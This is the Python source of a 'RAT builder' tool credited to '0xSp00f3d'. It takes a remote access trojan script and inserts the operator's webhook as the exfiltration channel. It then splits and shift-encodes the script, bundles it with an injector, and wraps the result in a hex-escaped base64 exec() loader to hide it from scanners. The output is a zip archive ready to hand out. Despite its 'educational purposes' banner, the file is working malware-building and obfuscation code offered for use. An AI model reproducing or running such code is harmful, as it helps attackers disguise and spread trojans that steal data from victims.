#<---       KS BUILDER by 0xSp00f3d         --->
#<---             python 3.x                --->
#<--- Only for educationnal / good purposes --->

import os
import requests
import colorama
import base64
import random
import shutil
import time
import string
import json

def readfile(path):
    with open(path, 'r', encoding='UTF-8') as f:
        data = f.read()
    return data


def writefile(path, data):
    with open(path, 'w', encoding='UTF-8') as f:
        f.write(data)


def read_json(file_path: str) -> dict:
    with open(file_path, 'r') as json_file:
        data = json.load(json_file)
    return data


def write_json(file_path: str, data: dict) -> None:
    with open(file_path, 'w') as json_file:
        json.dump(data, json_file)
        
        
def update_json(param, value):
    json_data = read_json(f"{os.getcwd()}\\utilities\\config.json")
    json_data[f"{param}"] = str(value)
    write_json(f"{os.getcwd()}\\utilities\\config.json", json_data)
     
       
def write_json(file_path: str, data: dict) -> None:
    with open(file_path, 'w') as json_file:
        json.dump(data, json_file)


def get_settings():
    with open(f"{os.getcwd()}\\utilities\\config.json", 'r') as json_file:
        json_data = json.load(json_file)
    return json_data["name"], json_data["path"], json_data["webhook"]


def webhook_checker(webhook_link):
    try:
        resp = requests.get(webhook_link)
        if resp.status_code != 200:
            return "Invalid"
        else:
            return "Valid"
    except Exception as e: 
        return "Invalid"
   
    
def base85_encoder(data):
    bytes_text = data.encode('UTF-8')
    b85_text = base64.b64encode(bytes_text)
    return b85_text.decode('UTF-8')


def script_hasher(script):
    nb_parties = random.randint(5, 10)
    longueur_partie = len(script) // nb_parties
    parties = [script[i * longueur_partie:(i + 1) * longueur_partie] for i in range(nb_parties - 1)]
    parties.append(script[(nb_parties - 1) * longueur_partie:])
    return parties


def part_encoder(part, alpha):
    key = ''.join(random.sample(alpha, 2))
    gap = sum(ord(c) for c in key) % 26
    text_int = ''
    for c in part:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 + gap) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 + gap) % 26 + 65)
        else:
            c_int = c
        text_int += c_int
    return base85_encoder(text_int + key)


def obfuscate(content):
    ltr = ''.join(random.choices(string.ascii_uppercase, k=4))
    OFFSET = 10
    VARIABLE_NAME = f'__{ltr}_{ltr}' * 100
    b64_content = base64.b64encode(content.encode()).decode()
    index = 0
    code = f'{VARIABLE_NAME} = ""\n'
    for _ in range(int(len(b64_content) / OFFSET) + 1):
        _str = ''
        for char in b64_content[index:index + OFFSET]:
            byte = str(hex(ord(char)))[2:]
            if len(byte) < 2:
                byte = '0' + byte
            _str += '\\x' + str(byte)
        code += f'{VARIABLE_NAME} += "{_str}"\n'
        index += OFFSET
    code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VARIABLE_NAME}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
    return code


def builder(banner, m, w):
    name, path_, webhook = get_settings()
    if not os.path.exists(path_):
        os.system("cls")
        print(f"{banner}\n\n {w}[{m}!{w}] The path seems to be incorrect...")
        time.sleep(3)
        main()
    elif webhook_checker(webhook) != "Valid":
        os.system("cls")
        agree = input(f"{banner}\n\n {w}[{m}!{w}] The webhook you entered seems to be wrong. Do you want to continue without using webhook (y/n) ?\n ---\n {w}[{m}>{w}] ")
        if agree == 'y':
            pass
        elif agree == 'n':
            main()
        else:   main()     
    elif not name:
        os.system("cls")
        print(f"{banner}\n\n {w}[{m}!{w}] Please enter a valid name!")
        time.sleep(3)
        main()
    
    try:
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        src_hashed = script_hasher(readfile(path_).replace('WBH', webhook))
        recompyler = readfile(os.path.join(os.getcwd(), 'utilities', 'recompyler.cs'))
        src_hashed = [part_encoder(part, alpha) for part in src_hashed]

        injector_with_all = readfile(os.path.join(os.getcwd(), 'utilities', 'injector.py')).replace("'RECOMPYLER'", recompyler)
        injector_with_all = injector_with_all.replace("'SRC_HASHED'", str(src_hashed))

        if os.path.exists(name):
            shutil.rmtree(name, ignore_errors=True)
        os.makedirs(name)
        os.makedirs(f'{name}\\addons')
        writefile(f'{name}\\{name}.py', obfuscate(injector_with_all))

        for logo in os.listdir(os.path.join(os.getcwd(), 'utilities', 'addons')):
            shutil.copy(os.path.join(os.getcwd(), 'utilities', 'addons', logo), os.path.join(os.getcwd(), name, 'addons', logo))

        shutil.make_archive(name, 'zip', name)
        shutil.rmtree(name, ignore_errors=True)
        os.system("cls")
        input(f"{banner}\n\n {w}[{m}+{w}] Your {name} RAT has been successfully built in ({name}.zip)!")
        main()
    except Exception as e:
        os.system("cls")
        print(e)
        input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the rat!")
        
        
def settings_menu(banner, w, m):
    while True:
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} RAT Setup:\n")
        print(f" {m}[{w}1{m}]{w} Change RAT name")
        print(f" {m}[{w}2{m}]{w} Change RAT path")
        print(f" {m}[{w}3{m}]{w} Change RAT webhook (optional)")
        print(f" {m}[{w}4{m}]{w} Back to home")
        choice_settings = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
        
        if choice_settings == "1": 
            os.system("cls")
            name = input(f"{banner}\n\n {w}[{m}+{w}] Enter rat name here: ")
            update_json("name", name)
            os.system("cls")
            print(f"{banner}\n\n {w}[{m}+{w}] RAT name updated succesfully as ({name}) !")
            time.sleep(3)
            
        elif choice_settings == "2": 
            os.system("cls") 
            rat_path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your rat path here: ")
            update_json("path", rat_path)
            os.system("cls")
            print(f"{banner}\n\n {w}[{m}+{w}] RAT path updated succesfully as ({rat_path}) !")
            time.sleep(3)
            
        elif choice_settings == "3": 
            os.system("cls")
            webhook = input(f"{banner}\n\n {w}[{m}+{w}] Enter your webhook here: ")
            update_json("webhook", webhook)
            os.system("cls")
            if webhook_checker(webhook) == "Invalid":
                print(f"{banner}\n\n {w}[{m}!{w}] The webhook you entered seems to be wrong..")
                time.sleep(3)
                settings_menu(banner, w, m)
            else: print(f"{banner}\n\n {w}[{m}+{w}] RAT webhook updated succesfully !")
            time.sleep(3)
            
        elif choice_settings == "4": 
            os.system("cls")
            main()
        


def main():
    m = colorama.Fore.LIGHTMAGENTA_EX
    w = colorama.Fore.LIGHTWHITE_EX
    banner = f"""\n ██████╗ ███████╗███████╗ ██████╗ ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
 ██████╔╝█████╗  ███████╗██║   ██║██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
 ██╔══██╗██╔══╝  ╚════██║██║   ██║██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
 ██║  ██║███████╗███████║╚██████╔╝███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
 ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
 {w}by 0xSp00f3d | Only for educational or good puposes""".replace('█', f'{w}█{m}')

    os.system('title Resolution Builder')
    os.system("cls")
    
    settings = get_settings()
    rat_name, rat_path, webhook = settings[0], settings[1], settings[2]

    webhook_info = webhook_checker(webhook)
    choices = {
        "1": lambda: builder(banner, m, w),
        "2": lambda: settings_menu(banner, w, m),
        "3": lambda: exit()
    }

    while True:
        os.system("cls")
        print(f"""{banner}\n -----\n
 {m}[{w}+{m}]{w} Menu:              |    {m}[{w}INFO{m}]{w} Current Settings:            
                        |
 {m}[{w}1{m}]{w} Build              |    {m}[{w}>{m}]{w} RAT name: {rat_name} 
 {m}[{w}2{m}]{w} Setup              |    {m}[{w}>{m}]{w} RAT path: {os.path.basename(rat_path)} 
 {m}[{w}3{m}]{w} Exit               |    {m}[{w}>{m}]{w} Webhook: {webhook_info}""")
        
        choice = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
        if choice in choices:
            choices[choice]()
        else:
            os.system("cls")
            print(f"{banner}\n\n {w}[{m}!{w}] Invalid option, please try again.")
            time.sleep(2)
            os.system("cls")
            continue
    
    
if __name__ == '__main__':
    main()
